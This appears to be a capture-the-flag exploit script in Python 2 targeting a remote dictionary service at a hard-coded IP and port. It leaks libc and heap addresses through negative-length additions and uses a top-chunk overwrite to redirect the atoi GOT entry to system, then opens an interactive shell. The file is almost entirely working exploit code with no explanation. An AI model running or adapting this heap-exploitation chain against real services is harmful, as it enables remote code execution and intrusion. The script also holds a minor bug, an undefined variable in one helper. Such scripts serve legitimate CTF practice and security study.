#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
host = "202.120.7.146"
port = 9992
#port = 8888

sock = make_conn(host,port)

def create(sock,word,content,fuck = 0):
    recvuntil(sock,"$")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(word))
    if not fuck :
        for i in range(word):
            recvuntil(sock,":")
            sendline(sock,content)

def add(sock,index,addlengh,content,fuck = 0):
    recvuntil(sock,"$")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,"?")
    sendline(sock,str(addlengh))
    if not fuck :
        for i in range(addlength):
            recvuntil(sock,":")
            sendline(sock,content)

def view(sock,index):
    recvuntil(sock,"$")
    sendline(sock,"3")
    recvuntil(sock,":")
    sendline(sock,str(index))
    return recvuntil(sock,"MyDict")

create(sock,4,"a")
create(sock,1,"b")
create(sock,4,"c")
create(sock,1,"d")
create(sock,4,"e")
create(sock,1,"f")
add(sock,0,-4,"a",1)
add(sock,2,-4,"a",1)
add(sock,0,-3,"a",1)
data = view(sock,0).split("\n")[1][3:]
bins = unpack32(data[:4].ljust(4,"\x00"))
heap = unpack32(data[4:].ljust(4,"\x00"))
libc = bins - 0x1a74d0 - 0x3000
heapbase = heap - 0xb0

print "libc :" +hex(libc)
print "heapbase :" +hex(heapbase)

atoigot = 0x804a038

sysoff = 0x40190
#sysoff = 0x3fcd0
#sysoff = 0x3f060
system = libc + sysoff

add(sock,4,134217729,"b",1)
recvuntil(sock,":")
sendline(sock,"a")
recvuntil(sock,":")
sendline(sock,"bbbb" + pack32(0xffffffff))
sendline(sock,"")

top = heapbase + 0x2b0
nb = (atoigot - top - 4 - 4 - 4 + 0x100000000 - 4*32 )/32 

print nb
add(sock,2,nb,"a",1)
sendline(sock,"")
payload = pack32(0x80484f6)
payload += pack32(0x8048506)
payload += pack32(0x8048516)
payload += pack32(0x8048526)
payload += pack32(system)
#payload += pack32(0x8048496)

create(sock,5,"a",1)
recvuntil(sock,":")
sendline(sock,payload)
sendline(sock,"")
inter(sock)

